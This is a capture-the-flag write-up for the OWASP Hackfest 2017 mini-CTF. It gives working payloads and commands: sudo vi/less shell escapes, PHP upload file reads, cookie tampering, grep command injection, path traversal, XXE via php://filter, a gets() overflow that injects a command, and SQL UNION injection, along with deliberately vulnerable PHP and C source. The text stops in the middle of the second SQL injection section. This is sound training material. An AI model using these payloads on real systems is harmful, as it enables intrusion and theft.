# OWASP CTF - owasp.zhack.ca

Challenges are [here](https://github.com/HoLyVieR/Hackfest-MiniCTF-2017).

## Privilege Escalation 1
>Find a way to elevate your privileges to 'admin'
Connection : ssh challenge@owasp.zhack.ca -p 1507
Password : password

Use sudo -l to discover what we can do.

```bash
challenge@19694104e162:~$ sudo -l
Matching Defaults entries for challenge on 19694104e162:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User challenge may run the following commands on 19694104e162:
    (admin) NOPASSWD: /usr/bin/vi /home/admin/message.txt

challenge@19694104e162:~$ sudo -u admin /usr/bin/vi /home/admin/message.txt
```
From within vi enter:

```bash
! /bin/bash
```
To start a bash shell as admin, and get the contents of the flag.

```bash
cat /home/admin/flag.txt
FLAG-b13886a1ff3d93049b967b10ba69b413
```

## Privilege Escalation 2
>Find a way to elevate your privileges to 'admin'
Connection : ssh challenge@owasp.zhack.ca -p 1503
Password : password

This looks familiar...

```bash
challenge@b28eab14b780:~$ sudo -l
Matching Defaults entries for challenge on b28eab14b780:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User challenge may run the following commands on b28eab14b780:
    (admin) NOPASSWD: /bin/less /home/admin/log.txt

sudo -u admin /bin/less /home/admin/log.txt
```

Just to mix it up a bit, enter the following from within less:

```bash
! cat /home/admin/flag.txt
FLAG-9d91493202554a1b0be924f19c741dbe
```


## Upload
>Find a way to view the flag in index.php

Upload a test file to find out the upload path.

```Image uploaded to "/upload-1/uploads/5e85b0ae56ae906c3892f6d7fd83eb2e/hts-in_progress.lock".```

Make a simple php script to display index.php file.
```php
<?php
echo file_get_contents( "../../index.php" );
?>
```
Navigate to uploaded file and inspect the page.
```php
<?php
  // FLAG-90831a06961d71bfeca38257aad7aa5c
  if (isset($_FILES['file'])) {
	$folderid = bin2hex(random_bytes(16));
	$uploaddir = '/var/www/html/uploads/' . $folderid . '/';
	mkdir($uploaddir);
	$uploadfile = $uploaddir . basename($_FILES['file']['name']);
	if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
  	$text = 'Image uploaded to "/upload-1/uploads/' . $folderid . '/' . basename($_FILES['file']['name']). '".';
	} else {
  	$error = 'Error while uploading file.';
	}
  }
?>
```

## Encoding
>Find a way to view the flag

Intercept HTTP request
```
GET /crypto-2/ HTTP/1.1
Host: owasp.zhack.ca
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: auth=eyJhbGxvd2VkIjpmYWxzZX0%3D;
session=***;
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

- Auth cookie ```eyJhbGxvd2VkIjpmYWxzZX0%3D``` looks like url encoded base 64. Decoding it returns ```{"allowed":false}```
- Change false to true, and resend the request using ```auth=eyJhbGxvd2VkIjp0cnVlfQ%3D```
- FLAG-297f30fc7d69b365821e5bb43ca089ec

## RCE
>Find a way to view the flag

Escape grep query with  
```flag" index.php \```, which results in ```grep -i "flag" index.php \" items.txt```

```php
<?php
index.php:  // FLAG-34063b7d03e40c97b860deff1c4729c0
index.php:  if (isset($_GET['search'])) {
index.php:	$command = 'grep -i "' . $_GET['search'] . '" items.txt';
index.php:	exec($command, $result);
index.php:	$result = implode("\n", $result);
index.php:  }
index.php:?
```
## Local File Inclusion
>Find a way to view the flag in index.php

PHP file uses /uploads dir to display the content.

http://owasp.zhack.ca/lfi-1/?path=dog.txt

Make a file display itself by
http://owasp.zhack.ca/lfi-1/?path=../index.php
```php
<?php
  // FLAG-61be296dafa12f88ac36a9d968fe92bf
  if (isset($_GET['path'])) {
	$content = file_get_contents('uploads/' . $_GET['path']);
  }
?>
```
## Direct Object Reference
>Find a way to view the flag

Brute-Force ```id``` to get an admin profile,
http://owasp.zhack.ca/rdi-1/?id=1
```
FLAG-5d09464c65a9c07b142c3db7c47b3b0e
```
## XXE
>Find a way to view the flag in index.php

Intercept HTTP request and inject this data.
```xml
<?xml version='1.0' ?><!DOCTYPE whatever[
<!ENTITY sp SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]>
<lookup><user>&sp;</user></lookup>
```
Returns the following page.
```html
<div class="alert alert-success" style="display: block;" id="message">Username PD9waHAKLy8gRkxBRy00ODU0MTI2ZWVmNDhhNGMxZWMyOTk5YjZhMDBiNmE2YgppZiAoaXNzZXQoJF9HRVRbJ3NlYXJjaCddKSkgewogIGxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIoZmFsc2UpOwogICR4bWwgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsKICAkZGF0YSA9IHNpbXBsZXhtbF9sb2FkX3N0cmluZygkeG1sLCAnU2ltcGxlWE1MRWxlbWVudCcsIExJQlhNTF9OT0VOVCk7CiAgaWYgKCRkYXRhLT51c2VyID09ICJhZG1pbiIpIHsKICAgIGVjaG8gJ1VzZXJuYW1lIGV4aXN0cyAhJzsKICB9IGVsc2UgewogICAgZWNobyAnVXNlcm5hbWUgJyAuICRkYXRhLT51c2VyIC4gJyBkb2VzblwndCBleGlzdHMuJzsKICB9CiAgZXhpdCgpOwp9Cj8+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxsaW5rIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICBmdW5jdGlvbiBzZWFyY2goKSB7CiAgICAgICAgdmFyIHVzZXJuYW1lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInVzZXJuYW1lIikudmFsdWU7CiAgICAgICAgdmFyIG1lc3NhZ2UgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibWVzc2FnZSIpOwogICAgICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgICAgICB4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgaWYgKHhoci5yZWFkeVN0YXRlID09IDQpIHsKICAgICAgICAgICAgbWVzc2FnZS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgICAgICAgbWVzc2FnZS5pbm5lckhUTUwgPSB4aHIucmVzcG9uc2VUZXh0OwogICAgICAgICAgfQogICAgICAgIH07CiAgICAgICAgeGhyLm9wZW4oIlBPU1QiLCAiP3NlYXJjaD0iLCB0cnVlKTsKICAgICAgICB4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwgInRleHQveG1sIik7CiAgICAgICAgeGhyLnNlbmQoIjxcP3htbCB2ZXJzaW9uPScxLjAnIFw/Pjxsb29rdXA+PHVzZXI+IiArIHVzZXJuYW1lICsgIjwvdXNlcj48L2xvb2t1cD4iKTsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgIH0KICAgIDwvc2NyaXB0PgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgIDxiciAvPjxiciAvPgogICAgICA8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIiBzdHlsZT0iZGlzcGxheTogbm9uZSIgaWQ9Im1lc3NhZ2UiPjwvZGl2PgogICAgICA8YnIgLz4KICAgICAgCiAgICAgIDxoMz5Vc2VybmFtZSBsb29rdXA8L2gzPgoKICAgICAgPGZvcm0gY2xhc3M9ImZvcm0iIG9uc3VibWl0PSJyZXR1cm4gc2VhcmNoKCk7Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgIDxsYWJlbCBmb3I9InVzZXJuYW1lIj5Vc2VybmFtZTwvbGFiZWw+CiAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJ1c2VybmFtZSIgLz4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIG9uY2xpY2s9InNlYXJjaCgpIiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5Ij5TZWFyY2g8L2J1dHRvbj4KICAgICAgPC9mb3JtPgogICAgPC9kaXY+CiAgPC9ib2R5Pgo8L2h0bWw+ doesn't exists.</div>
```
Decode base64 and extract the flag
```php
<?php
// FLAG-4854126eef48a4c1ec2999b6a00b6a6b
if (isset($_GET['search'])) {
  libxml_disable_entity_loader(false);
  $xml = file_get_contents('php://input');
  $data = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
  if ($data->user == "admin") {
	echo 'Username exists !';
  } else {
	echo 'Username ' . $data->user . ' doesn\'t exists.';
  }
  exit();
}
?>
```
## Exploit
>Find a way to elevate your privileges to 'admin'
Connection : ssh challenge@owasp.zhack.ca -p 1504
Password : password

This one was really cool. First figure out what permissions we have:

```bash
sudo -l

challenge@01720a5d8de3:/home/admin$ sudo -u admin /home/admin/challenge
```

challenge is the compiled binary of this c program, which resides in the same directory.

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void main() {
        if (seteuid(1001) == -1 || setuid(1001) == -1 || setegid(1001) == -1 || setgid(1001) == -1) {
                printf("Error for 'setuid'\n");
        }

        char command[100];
        char user[20];

        puts("Command : ");
        gets(command);

        if (strcmp(command, "ls") != 0 && strcmp(command, "echo 'Hello World!'") != 0) {
                puts("Valid command are : ");
                puts(" - ls");
                puts(" - echo 'Hello World!'");
                exit(0);
        }

        puts("User : ");
        gets(user);

        write(1, "Hello ", 6);
        write(1, user, strlen(user));
        puts("!");

        system(command);
```

Interesting from the gets manual page:

>Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read,  and  because  gets()
   	will  continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use
   	fgets() instead.

Since the program doesn't verify the length of the input, we can perform a buffer overflow via a long input and override the value of the command variable on the stack. This is useful, because it's done after the variable has already passed the programs checks for legitimacy.

In Practice, it looks like this:

```bash
challenge@01720a5d8de3:/home/admin$ sudo -u admin /home/admin/challenge
Command :
ls
User :
ABCDEFGHIJKLMNOPQRSTUVWXYZA1B1C1cat /home/admin/flag.txt
Hello ABCDEFGHIJKLMNOPQRSTUVWXYZA1B1C1cat /home/admin/flag.txt!
FLAG-d0b82ec683f845f7b4d74fec13212224
```

## SQL Injection 1
>Find the flag in the database

Querying for ```123``` produces ```
SELECT * FROM items WHERE name LIKE "%123%"```

- Escape with ```%"```
- UNION for for the field in another table
- Ignore the rest of the query with ```--```

Injection query would be ```%" UNION SELECT flag,3 FROM flag;--```
```
FLAG-8c0f78bd9f65fb6b2d553ae30db6e612
```

## SQL Injection 2
>Find the flag in the database

Using trial and error method we find that a certain amount of characters is blacklisted:

- Whitespace
- ``/* */``
- `Union`
- ``;``
